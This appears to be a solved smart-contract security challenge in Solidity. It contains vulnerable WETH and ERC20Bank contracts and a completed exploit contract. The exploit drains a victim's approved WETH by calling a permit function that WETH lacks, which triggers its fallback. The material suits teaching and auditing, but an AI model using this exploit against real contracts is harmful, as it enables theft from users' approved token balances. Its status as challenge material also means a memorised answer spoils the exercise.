/*

Alice has 10 WETH and deposited 1 WETH into ERC20Bank.

Thinking she might deposit more later, she has set inifinite approval on ERC20Bank.

In other words, ERC20Bank can spend unlimited amount of WETH owned by Alice.

Here are the contracts that you will need for this challenge.


Tasks: 
    - Complete the function
        function pwn(address alice) external {}

        This function must transfer all Alice's WETH to this contract. 
        WETH deposited by Alice and locked in ERC20Bank can be ignored.
*/

pragma solidity ^0.8.20;

contract WETH is ERC20 {
    event Deposit(address indexed account, uint amount);
    event Withdraw(address indexed account, uint amount);

    constructor() ERC20("Wrapped Ether", "WETH", 18) {}

    fallback() external payable {
        deposit();
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint _amount) external {
        _burn(msg.sender, _amount);
        payable(msg.sender).transfer(_amount);
        emit Withdraw(msg.sender, _amount);
    }
}

contract ERC20Bank {
    IERC20Permit public immutable token;
    mapping(address => uint) public balanceOf;

    constructor(address _token) {
        token = IERC20Permit(_token);
    }

    function depositWithPermit(
        address owner,
        address spender,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        token.permit(owner, spender, amount, deadline, v, r, s);
        token.transferFrom(owner, address(this), amount);
        balanceOf[spender] += amount;
    }

    function deposit(uint _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        balanceOf[msg.sender] += _amount;
    }

    function withdraw(uint _amount) external {
        balanceOf[msg.sender] -= _amount;
        token.transfer(msg.sender, _amount);
    }
}

interface IERC20Permit is IERC20 {
    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
}

interface IERC20Bank {
    function token() external view returns (address);

    function deposit(uint amount) external;

    function depositWithPermit(
        address owner,
        address spender,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function withdraw(uint amount) external;
}

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        // ERC20Bank contract
        target = _target;
    }

    /*
        - Call permit on WETH
        - permit doesn't exist on WETH so the fallback function will be executed
        - Transfer WETH from Alice to ERC20Bank
        - Credit ERC20BankExploit for the WETH that was just transferred.
        - call withdraw to transfer WETH out of ERC20Bank.
    */
    function pwn(address alice) external {
        // Write your code here
        address weth = IERC20Bank(target).token();
        uint bal = IERC20(weth).balanceOf(alice);

        IERC20Bank(target).depositWithPermit(
            alice,
            address(this),
            bal,
            0,
            0,
            "",
            ""
        );

        IERC20Bank(target).withdraw(bal);
    }
}
